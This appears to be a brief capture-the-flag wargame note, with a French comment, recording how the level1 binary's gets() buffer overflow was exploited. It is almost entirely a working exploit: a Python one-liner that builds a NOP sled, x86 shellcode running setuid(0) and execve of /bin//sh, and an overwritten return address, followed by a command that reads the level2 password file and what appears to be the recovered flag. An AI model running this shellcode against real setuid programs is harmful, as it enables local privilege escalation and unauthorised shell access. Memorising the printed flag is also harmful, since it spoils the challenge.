#gets est vunerable utiliser gdb pour implementer un shellcode et le lire(erase eip)
echo $(python -c 'print "\x90" * 20 + "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" + "\x90" * 20 + "\xe0\xf6\xff\xbf" + "\xe0\xf6\xff\xbf"') > /tmp/test2 ; cat /tmp/test2 - | /home/user/level1/level1

cat /home/user/level2/.pass

#53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77